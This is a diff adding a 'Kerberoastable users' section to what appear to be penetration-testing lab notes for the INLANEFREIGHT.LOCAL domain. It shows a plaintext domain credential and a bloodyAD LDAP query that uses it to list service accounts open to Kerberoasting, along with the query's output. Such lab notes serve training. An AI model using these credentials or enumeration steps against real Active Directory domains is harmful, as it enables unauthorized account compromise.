@@ -1883,3 +1883,49 @@ SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019
 SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\backupadm:!qazXSW@
 
 ```
+
+## Kerberoastable users
+
+```bash
+bloodyAD --host 172.16.8.3 -d INLANEFREIGHT.LOCAL -u 'backupadm' -p '!qazXSW@' get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName
+
+distinguishedName: CN=azureconnect,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+sAMAccountName: azureconnect
+
+distinguishedName: CN=backupjob,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+sAMAccountName: backupjob
+
+distinguishedName: CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+sAMAccountName: krbtgt
+
+distinguishedName: CN=mssqlsvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+sAMAccountName: mssqlsvc
+
+distinguishedName: CN=sqltest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+sAMAccountName: sqltest
+
+distinguishedName: CN=sqlqa,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+sAMAccountName: sqlqa
+
+distinguishedName: CN=sqldev,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+sAMAccountName: sqldev
+
+distinguishedName: CN=mssqladm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+sAMAccountName: mssqladm
+
+distinguishedName: CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+sAMAccountName: svc_sql
+
+distinguishedName: CN=sqlprod,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+sAMAccountName: sqlprod
+
+distinguishedName: CN=sapsso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+sAMAccountName: sapsso
+
+distinguishedName: CN=sapvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+sAMAccountName: sapvc
+
+distinguishedName: CN=vmwarescvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+sAMAccountName: vmwarescvc
+
+```
